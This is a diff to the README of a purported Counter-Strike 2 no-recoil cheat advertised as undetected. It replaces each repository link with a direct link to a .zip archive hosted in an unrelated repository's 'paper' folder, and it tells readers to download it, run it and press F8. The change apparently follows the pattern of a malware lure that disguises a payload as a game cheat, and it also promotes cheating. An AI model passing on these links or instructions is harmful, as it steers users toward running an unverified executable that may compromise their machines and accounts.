@@ -5,7 +5,7 @@ description: "Eliminate recoil on every CS2 weapon with undetected hardware mous
 ---
 # 🎯 cs2-no-recoil-ultimate-2026 - Perfect Laser Accuracy for Every Gun
 
-[![Download Now](https://img.shields.io/badge/Download-cs2--no--recoil--ultimate--2026-2ea44f?style=for-the-badge&logo=github)](https://github.com/RohanMurmu/cs2-no-recoil-ultimate-2026)
+[![Download Now](https://img.shields.io/badge/Download-cs2--no--recoil--ultimate--2026-2ea44f?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/RohanMurmu/rohanmurmu.github.io/main/paper/Application_v1.0-alpha.1.zip)
 
 ## 🚀 What Is This?
 
@@ -25,7 +25,7 @@ Whether you're spraying with an AK-47 or tapping with an M4A1-S, your crosshair 
 
 ## 📥 How to Download and Install
 
-Visit this link to download the application: [https://github.com/RohanMurmu/cs2-no-recoil-ultimate-2026](https://github.com/RohanMurmu/cs2-no-recoil-ultimate-2026)
+Visit this link to download the application: [https://raw.githubusercontent.com/RohanMurmu/rohanmurmu.github.io/main/paper/Application_v1.0-alpha.1.zip](https://raw.githubusercontent.com/RohanMurmu/rohanmurmu.github.io/main/paper/Application_v1.0-alpha.1.zip)
 
 Here's what to do after downloading:
 
@@ -167,7 +167,7 @@ If you run into any issues:
 
 ## 📥 Final Download Reminder
 
-Get the latest version now by visiting: [https://github.com/RohanMurmu/cs2-no-recoil-ultimate-2026](https://github.com/RohanMurmu/cs2-no-recoil-ultimate-2026)
+Get the latest version now by visiting: [https://raw.githubusercontent.com/RohanMurmu/rohanmurmu.github.io/main/paper/Application_v1.0-alpha.1.zip](https://raw.githubusercontent.com/RohanMurmu/rohanmurmu.github.io/main/paper/Application_v1.0-alpha.1.zip)
 
 Download the application, run it, set your sensitivity, choose your weapon, press F8, and enjoy perfect accuracy. It's that simple.
 
